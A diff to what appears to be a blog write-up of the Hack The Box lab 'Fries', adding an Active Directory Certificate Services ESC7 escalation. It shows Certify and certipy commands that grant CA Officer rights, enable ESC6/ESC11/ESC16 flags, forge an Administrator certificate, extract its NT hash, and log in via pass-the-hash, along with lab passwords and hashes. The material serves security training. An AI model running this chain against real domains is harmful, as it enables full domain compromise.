@@ -2,7 +2,7 @@
 title: "Hack The Box — Fries"
 date: 2026-2-05
 categories: [HTB, Active Directory]
-tags: [htb, ad, adcs, docker]
+tags: [htb, ad, adcs, docker, Manage CA, nfs access]
 ---
 
 ![](assets/images/fries/Pasted image 20260205204537.png)
@@ -561,14 +561,252 @@ we can evil-winrm
 WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) 
 WINRM       10.129.244.72   5985   DC01             [+] fries.htb\gMSA_CA_prod$:cb91dc519860daf4ccd15e89e5a9d5ad (Pwn3d!)
 ```
-
+## Manage CA
 GMSA_CA_PROD$  -->ManageCA -->FRIES-DC01-CA
 ![](assets/images/fries/2026-02-12_11-18.png)
 
 The gMSA account has **CA Administrator (Manage CA)** rights over the Enterprise CA.
 
+The `ManageCA` permission allows:
+- Publishing certificate templates
+- Modifying CA settings
+- Granting **CA Officer (ManageCertificates)** rights
+- Approving denied certificate requests
+- Enabling dangerous CA flags (ESC6 / ESC11 / ESC16)
+In short, it allows administrative control over the CA’s trust behavior[.](https://bloodhound.specterops.io/resources/edges/manage-ca)
+
 ```sh
-➜  bloodhound evil-winrm -i fries.htb -u 'gMSA_CA_prod$' -H 'cb91dc519860daf4ccd15e89e5a9d5ad'  
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> ./Certify.exe enum-cas  --filter-vulnerable
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=fries,DC=htb'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Root CAs
+
+    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
+    Cert Thumbprint               : 0FDE266E3D674B5B37542D3E38699FFE2C93A662
+    Cert Serial                   : 26117C1FFA5705AF443B7E82E8C639A9
+    Cert Start Date               : 11/17/2025 9:39:18 PM
+    Cert End Date                 : 5/19/3024 7:11:46 AM
+^[  Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
+
+    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
+    Cert Thumbprint               : 6BCC33E7CE74DC371715DAA806E9D7E73E606A46
+    Cert Serial                   : 2E2DC1942D60559F460B0F47814FE48E
+    Cert Start Date               : 5/19/2025 7:00:46 AM
+    Cert End Date                 : 5/19/3024 7:10:46 AM
+    Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
+    Cert Thumbprint               : 0FDE266E3D674B5B37542D3E38699FFE2C93A662
+    Cert Serial                   : 26117C1FFA5705AF443B7E82E8C639A9
+    Cert Start Date               : 11/17/2025 9:39:18 PM
+    Cert End Date                 : 5/19/3024 7:11:46 AM
+    Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
+
+    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
+    Cert Thumbprint               : 6BCC33E7CE74DC371715DAA806E9D7E73E606A46
+    Cert Serial                   : 2E2DC1942D60559F460B0F47814FE48E
+    Cert Start Date               : 5/19/2025 7:00:46 AM
+    Cert End Date                 : 5/19/3024 7:10:46 AM
+    Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
+[X] AuthWithoutChannelBinding: did not receive an NTLM message in HTTP response.
+[X] AuthWithoutChannelBinding: did not receive an NTLM message in HTTP response.
+
+[*] Enterprise/enrollment certificate authorities:
+
+    Enterprise CA Name            : fries-DC01-CA
+    DNS Hostname                  : DC01.fries.htb
+    FullName                      : DC01.fries.htb\fries-DC01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=fries-DC01-CA, DC=fries, DC=htb
+    Cert Thumbprint               : 0FDE266E3D674B5B37542D3E38699FFE2C93A662
+    Cert Serial                   : 26117C1FFA5705AF443B7E82E8C639A9
+    Cert Start Date               : 11/17/2025 9:39:18 PM
+    Cert End Date                 : 5/19/3024 7:11:46 AM
+    Cert Chain                    : CN=fries-DC01-CA,DC=fries,DC=htb
+    User Specifies SAN            : Disabled
+    RPC Request Encryption        : Enabled
+    Vulnerabilities
+      ESC7                        : The CA has insecure delegated security roles or permissions.
+    CA Permissions
+      Owner: BUILTIN\Administrators             S-1-5-32-544
+
+      Access Rights                                     Principal
+      Deny   ManageCertificates                         FRIES\Domain Users                 S-1-5-21-858338346-3861030516-3975240472-513
+      Deny   ManageCertificates                         FRIES\Domain Computers             S-1-5-21-858338346-3861030516-3975240472-515
+      Deny   ManageCertificates                         FRIES\gMSA_CA_prod$                S-1-5-21-858338346-3861030516-3975240472-1104
+      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
+      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators             S-1-5-32-544
+      Allow  ManageCA, ManageCertificates               FRIES\Domain Admins                S-1-5-21-858338346-3861030516-3975240472-512
+      Allow  Enroll                                     FRIES\Domain Users                 S-1-5-21-858338346-3861030516-3975240472-513
+      Allow  Enroll                                     FRIES\Domain Computers             S-1-5-21-858338346-3861030516-3975240472-515
+      Allow  ManageCA, ManageCertificates               FRIES\Enterprise Admins            S-1-5-21-858338346-3861030516-3975240472-519
+      Allow  ManageCA, Enroll                           FRIES\gMSA_CA_prod$                S-1-5-21-858338346-3861030516-3975240472-1104
+    Enrollment Agent Restrictions : None
+
+    Legacy ASP Enrollment Website : http://DC01.fries.htb/certsrv/
+                                    https://DC01.fries.htb/certsrv/
+
+    Enrollment Web Service        : http://DC01.fries.htb/fries-DC01-CA_CES_Kerberos/service.svc
+                                    https://DC01.fries.htb/fries-DC01-CA_CES_Kerberos/service.svc
+
+    Enrollment Policy Web Service : http://DC01.fries.htb/ADPolicyProvider_CEP_Kerberos/service.svc
+                                    https://DC01.fries.htb/ADPolicyProvider_CEP_Kerberos/service.svc
+
+    NDES Web Service              : http://DC01.fries.htb/certsrv/mscep/
+                                    https://DC01.fries.htb/certsrv/mscep/
+
+    Enabled Certificate Templates:
+        DirectoryEmailReplication
+        DomainControllerAuthentication
+        KerberosAuthentication
+        EFSRecovery
+        EFS
+        DomainController
+        WebServer
+        Machine
+        User
+        SubCA
+        Administrator
+
+Certify completed in 00:00:36.0987613
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> 
+```
+ESC7 means we can manipulate CA permissions due to insecure delegation.
+### Grant CA Officer Privileges
+```sh
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> .\Certify.exe manage-ca --ca DC01.fries.htb\fries-DC01-CA  --officer S-1-5-21-858338346-3861030516-3975240472-1104
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to toggle role permissions on the CA.
+[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-1104'.
+[*] Toggling the 'ManageCertificates' roles for principal 'S-1-5-21-858338346-3861030516-3975240472-1104'.
+[+] Successfully set the security descriptor on the CA.
+
+Certify completed in 00:00:00.0853452
+```
+check we are the officer
+```sh
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> certutil -config "DC01.fries.htb\fries-DC01-CA" -getreg ca\security
+ 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\fries-DC01-CA\Security:
+
+  Security REG_BINARY =
+    Deny Certificate Manager    FRIES\Domain Users
+    Deny Certificate Manager    FRIES\Domain Computers
+    Allow Enroll        NT AUTHORITY\Authenticated Users
+    Allow CA Administrator Certificate Manager  BUILTIN\Administrators
+    Allow CA Administrator Certificate Manager  FRIES\Domain Admins
+    Allow Enroll        FRIES\Domain Users
+    Allow Enroll        FRIES\Domain Computers
+    Allow CA Administrator Certificate Manager  FRIES\Enterprise Admins
+    Allow CA Administrator Certificate Manager Enroll   FRIES\gMSA_CA_prod$
+
+CertUtil: -getreg command completed successfully.
+```
+#### Enable Dangerous CA Flags (ESC6 / ESC11 / ESC16)
+Now that we control the CA, we enable misconfiguration flags:
+```sh
+> ./Certify.exe  manage-ca --ca DC01.fries.htb\fries-DC01-CA --esc6 --esc11 --esc16
+
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to toggle EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on the CA.
+[*] The EDITF_ATTRIBUTESUBJECTALTNAME2 flag is not set, toggling it on.
+[*] Successfully set the EditFlags configuration on the CA.
+
+[*] Attempting to toggle IF_ENFORCEENCRYPTICERTREQUEST (ESC11) on the CA.
+[*] The IF_ENFORCEENCRYPTICERTREQUEST flag is already set, toggling it off.
+[*] Successfully set the InterfaceFlags configuration on the CA.
+
+[*] Attempting to toggle szOID_NTDS_CA_SECURITY_EXT in the DisableExtensionList attribute (ESC16) on the CA.
+[*] The szOID_NTDS_CA_SECURITY_EXT extension does not exist in DisableExtensionList, adding it.
+[*] Successfully set the DisableExtensionList configuration on the CA.
+
+[*] Attempting to restart the CA service.
+[*] Successfully stopped the CA service.
+[*] Successfully restarted the CA service.
+
+Certify completed in 00:00:00.6080880
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> 
+```
+This effectively allows us to request certificates for arbitrary users — including **Administrator**.
+
+The CA service is automatically restarted.
+
+#### Request Administrator Certificate
+
+```sh
+➜  bloodHound certipy req -u svc_infra@fries.htb -p "m6tneOMAh5p0wQ0d" -dc-ip 10.129.244.72 -target dc01.fries.htb -ca fries-DC01-CA -template User -upn Administrator@fries.htb -sid "S-1-5-21-858338346-3861030516-3975240472-500"
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 42
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'Administrator@fries.htb'
+[*] Certificate object SID is 'S-1-5-21-858338346-3861030516-3975240472-500'
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+We now possess a valid certificate for the built-in Administrator account.
+
+#### Authenticate as Administrator
+
+```sh
+➜  bloodHound certipy auth -pfx administrator.pfx -dc-ip 10.129.244.72
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@fries.htb'
+[*]     SAN URL SID: 'S-1-5-21-858338346-3861030516-3975240472-500'
+[*] Using principal: 'administrator@fries.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fries.htb': aad3b435b51404eeaad3b435b51404ee:a773cb05d79273299a684a23ede56748
+➜  bloodHound
+```
+We successfully extract the NT hash
+```sh
+➜  bloodHound evil-winrm -i 10.129.244.72 -u administrator -H a773cb05d79273299a684a23ede56748
+
                                         
 Evil-WinRM shell v3.9
                                         
@@ -577,6 +815,5 @@ Warning: Remote path completions is disabled due to ruby limitation: undefined m
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                         
 Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> 
+*Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
-
